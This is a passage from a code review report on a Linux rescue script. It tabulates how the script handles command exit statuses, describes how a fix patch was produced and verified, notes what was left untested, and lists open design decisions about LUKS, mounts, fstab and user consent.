| 157 | `grub-mkconfig -o /boot/grub/grub.cfg` | checked (plus `grep menuentry`) |
| 161 | `sunshine-doctor --fix` | **status lost in pipeline** (finding 14) |
| 179 | `id "$user"` | checked, but uses `die` after mount (finding 4) |
| 180 | `chpasswd` (stdin `user:pass`) | checked, but uses `die` after mount (finding 4) |
| 181 | `passwd "$user"` | checked, but uses `die` after mount (finding 4) |
| 182 | `faillock --user "$user" --reset` | deliberately ignored (`; true`) |
| 191 | `/bin/bash` | status discarded (low) |
| 192 | `"$@"` (`run` subcommand) | correctly captured in `rc` and returned after `do_umount` |

## 5. Patch, verification and limits

`docs/team/reports/rescue-fixes.patch` is one unified diff against `overlay/system/usr/local/bin/sunshine-rescue`. It was produced by copying the original to `/tmp/rescue-edit.sh`, editing only that copy, running `diff -u`, and rewriting the two header paths to `a/overlay/...` and `b/overlay/...`. Verified:

```console
$ git apply --check docs/team/reports/rescue-fixes.patch
$ echo $?
0
$ bash -n /tmp/rescue-edit.sh && PATH=/home/tak/.local/bin:$PATH shellcheck -S warning /tmp/rescue-edit.sh
0   # both: no syntax errors, no warnings
```

The patch implements findings **1–14** (all critical, high and medium findings). The low-severity items in section 2 are intentionally untouched to keep the change minimal.

Not done / not verifiable here: the script was never run; no real mount, fsck, cryptsetup, GRUB install, chroot or network operation was performed; the patched script was not boot-tested. The `osname()` parser handles the standard `PRETTY_NAME="…"` and unquoted forms only (it does not decode `\xNN` escapes from os-release).

### Decisions for the senior developer

1. **LUKS policy**: the patch closes only mappings this tool opened (recorded in `/run/sunshine-rescue/luks`); mappings left behind by a killed previous invocation are no longer closed automatically. If you prefer closing all `sunshine-luks-*` mappings, that must be an explicit policy decision together with finding 2.
2. **`noauto`/`x-systemd.automount`**: the patch mounts these entries during rescue (needed for `noauto` `/boot` and ESP). If automount entries should instead be left alone, finding 6 needs a different fix (mount them only for `repair`/`bootloader`/`initramfs`).
3. **Lazy unmount**: the patch warns and returns failure but still uses `umount -Rl` as a fallback. If a busy mount should be a hard error instead, remove that fallback.
4. **fstab repair scope**: finding 7 only stops false failures for `nofail`; it does not fix a wrong UUID. Automatically rewriting fstab from `blkid` was out of scope for a minimal safety patch.
5. **Consent**: `e2fsck -fy` (line 170) and `pacman -S --noconfirm` (line 126) still act without asking; adding a `--yes` flag or interactive confirmation is a product decision.
6. **btrfs subvolume coverage**: `scan` still recognises only `@`, `root`, `rootfs`; supporting `@boot`, `@home`-only or snapshot-boot layouts (finding 12 / section 3 example 2) needs a design decision about subvolume discovery.
